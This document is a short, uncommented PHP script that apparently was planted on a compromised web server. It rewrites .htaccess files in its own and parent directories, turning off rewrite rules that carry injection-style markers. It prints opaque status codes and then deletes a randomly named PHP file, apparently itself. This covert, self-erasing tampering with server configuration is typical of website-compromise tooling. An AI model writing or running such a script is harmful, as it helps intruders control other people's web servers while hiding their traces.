<?php
$dirs = array("../", "../../", "");
foreach($dirs as $dir){
	$stat = clear_htaccess($dir);
	echo $stat;
}
function clear_htaccess($dir) {
	chmod($dir.".htaccess", 0644);
	$hta = file_get_contents($dir.".htaccess");
	if(preg_match("/\!\!\#\#\!\!\#\#\nRewriteEngine on/is", $hta) || preg_match("/\t\tRewriteEngine\ On/is", $hta)){
		$out = str_ireplace("\t\t\t\t\t\tRewriteEngine On", "\t\t\t\t\t\tRewriteEngine Off", $hta);
		$out = str_ireplace("!!##!!##\nRewriteEngine on", "!!##!!##\nRewriteEngine Off", $out);
		unlink($dir.".htaccess");
		$htf = fopen($dir.".htaccess", "w");
		fwrite($htf, $out);
		return "KLJhfhoi";
	}
	else return "IOgskghj";
}
unlink("LijHgs3_3042723.php");